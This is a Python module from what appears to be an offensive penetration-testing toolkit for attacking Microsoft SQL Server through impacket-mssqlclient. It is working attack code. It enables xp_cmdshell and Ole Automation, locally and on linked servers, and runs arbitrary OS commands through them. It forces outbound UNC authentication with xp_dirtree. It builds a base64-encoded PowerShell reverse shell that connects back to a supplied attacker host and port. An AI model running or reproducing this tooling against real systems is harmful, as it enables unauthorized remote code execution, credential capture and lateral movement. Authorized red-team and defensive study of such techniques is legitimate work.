# modules/attack_mssql.py

from core.colors import red, green, yellow, blue
from core.helpers import run_command, print_table
import base64
import re

def escape_sql_string(s):
    return s.replace("'", "''").replace('"', '""')

def attack_mssql(session, action=None, command=None, target=None, lhost=None, lport=None):
    print(blue(f"[*] Executing MSSQL attack: {action}"))

    if not action or action.lower() == "help":
        print(blue("Usage: attack mssql <action> [args]"))
        print("Available Actions:")
        print("  help                            - Show this help message")
        print("  enable_xp                       - Enable xp_cmdshell")
        print("  enable_xp_linked <srv>          - Enable xp_cmdshell on linked server")
        print("  enable_oacreate                 - Enable Ole Automation Procedures")
        print("  exec <cmd>                      - Run command via xp_cmdshell")
        print("  fallback_exec <cmd>             - Run command via xp_cmdshell or sp_OACreate fallback")
        print("  revshell                        - PowerShell reverse shell (asks for LHOST/LPORT)")
        print("  linked_revshell <srv>           - Reverse shell via linked server")
        print("  query_linked <srv> <cmd>        - Run cmd on linked server via xp_cmdshell")
        print("  xp_dirtree <unc_path>           - Trigger outbound connection via xp_dirtree (UNC path)")
        return

    full_user = f"{session.domain}/{session.username}"
    base_cmd = f"impacket-mssqlclient {full_user}:{session.password}@{session.dc_ip} -windows-auth -command"

    def clean(text):
        lines = text.strip().splitlines()
        output = []
        for line in lines:
            line = line.strip()
            if any(line.startswith(s) for s in ["[*]", "[-]", "Impacket"]) or line.lower().startswith("sql>"):
                continue
            if line:
                output.append(line)
        return output

    def exec_sql(sql):
        cmd = f"{base_cmd} \"{sql}\""
        out, err = run_command(cmd)

        if "Login failed for user" in err or "Login failed" in out:
            print(yellow("[!] Falling back to SQL Auth (no -windows-auth)"))
            fallback_cmd = f"impacket-mssqlclient {session.username}:{session.password}@{session.dc_ip} -command \"{sql}\""
            out, err = run_command(fallback_cmd)

        return out, err

    def parse_and_print_table(raw_lines):
        if not raw_lines:
            print(yellow("[!] No output received."))
            return

        headers, rows = [], []
        separator_found = False

        for idx, line in enumerate(raw_lines):
            line = line.strip()
            if idx == 0:
                headers = re.split(r"\s{2,}", line)
            elif re.match(r"^[\-\s]+$", line):
                separator_found = True
            else:
                parts = re.split(r"\s{2,}", line)
                if len(parts) == len(headers):
                    rows.append(parts)
                else:
                    rows.append([line])

        if headers and rows and separator_found:
            print_table(headers, rows)
        elif rows:
            print_table(["Value"], [[r[0]] if isinstance(r, list) else [r] for r in rows])
        else:
            print_table(["Result"], [[line] for line in raw_lines])

    actions = {
        "enable_xp": "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
        "enable_oacreate": "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;",
                }

    if action in actions:
        out, err = exec_sql(actions[action])
        output = clean(out)
        print(green("\n[+] Output:"))
        if not output:
            print(red("[-] No output or insufficient permissions. Are you sysadmin?"))
        else:
            parse_and_print_table(output)
        return

    if action == "query_linked":
        if not target:
            target = input("[?] Enter linked server name: ").strip()
        if not command:
            command = input("[?] Enter command to run on linked server: ").strip()
        safe_cmd = escape_sql_string(command)
        query = f"EXEC ('EXEC xp_cmdshell ''{safe_cmd}''') AT [{target}]"
        out, err = exec_sql(query)
        print(green("\n[+] Output from linked server:"))
        parse_and_print_table(clean(out))
        return

    if action == "enable_xp_linked":
        if not target:
            target = input("[?] Enter linked server name: ").strip()
        query = (
            f"EXEC ('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE; "
            f"EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [{target}]"
        )
        out, err = exec_sql(query)
        print(green("\n[+] Output:"))
        parse_and_print_table(clean(out))
        return

    if action == "exec":
        if not command:
            command = input("[?] Enter command to run: ").strip()
        safe_cmd = escape_sql_string(command)
        query = f"EXEC xp_cmdshell '{safe_cmd}'"
        out, err = exec_sql(query)
        print(green("\n[+] Output:"))
        parse_and_print_table(clean(out))
        return

    if action == "fallback_exec":
        if not command:
            command = input("[?] Enter command to run: ").strip()
        safe_cmd = escape_sql_string(command)
        fallback = (
            "DECLARE @shell INT; EXEC sp_OACreate 'WScript.Shell', @shell OUT; "
            f"EXEC sp_OAMethod @shell, 'Run', NULL, '{safe_cmd}'"
        )
        out, err = exec_sql(fallback)
        print(green("\n[+] Output:"))
        parse_and_print_table(clean(out))
        return

    if action == "revshell" or action == "linked_revshell":
        if not lhost:
            lhost = input("[?] Enter LHOST: ").strip()
        if not lport:
            lport = input("[?] Enter LPORT: ").strip()
        payload = (
            f"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
            f"while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
            f"$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> '"
            f";$s.Write(([text.encoding]::ASCII).GetBytes($sb2),0,$sb2.Length);$s.Flush()}}"
        )
        b64 = base64.b64encode(payload.encode('utf-16le')).decode()
        ps = f"powershell -EncodedCommand {b64}"
        if action == "revshell":
            query = f"EXEC xp_cmdshell '{ps}'"
        else:
            if not target:
                target = input("[?] Enter linked server name: ").strip()
            safe_ps = escape_sql_string(ps)
            query = f"EXEC ('EXEC xp_cmdshell ''{safe_ps}''') AT [{target}]"
        out, err = exec_sql(query)
        print(green("\n[+] Output:"))
        parse_and_print_table(clean(out))
        return

    if action == "xp_dirtree":
        if not command:
            command = input("[?] Enter UNC path (e.g., \\\\\\\\attacker\\\\share): ").strip()

        # If user included full params: '\\\\ip\\share', 1, 1
        if command.count(",") == 2:
            query = f"EXEC master..xp_dirtree {command}"
        else:
            unc = escape_sql_string(command.strip("'").strip('"'))
            query = f"EXEC master..xp_dirtree '{unc}'"

        out, err = exec_sql(query)
        cleaned = clean(out)
        print(green("\n[+] Output:"))
        if not cleaned:
            print(yellow("[!] No output received or connection failed."))
        else:
            parse_and_print_table(cleaned)
        return
